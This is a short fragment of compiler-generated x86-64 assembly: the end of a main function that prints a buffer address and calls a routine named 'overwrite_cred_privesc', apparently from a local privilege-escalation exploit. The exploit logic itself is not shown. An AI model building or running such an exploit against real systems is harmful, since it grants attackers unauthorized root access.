	leaq	.LC24(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	g_buf_addr(%rip), %rax
	movq	%rax, %rsi
	leaq	.LC25(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
	call	overwrite_cred_privesc
	movl	$0, %eax
	movq	-8(%rbp), %rcx
	xorq	%fs:40, %rcx
	je	.L71
	call	__stack_chk_fail@PLT
.L71:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE20:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5
0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
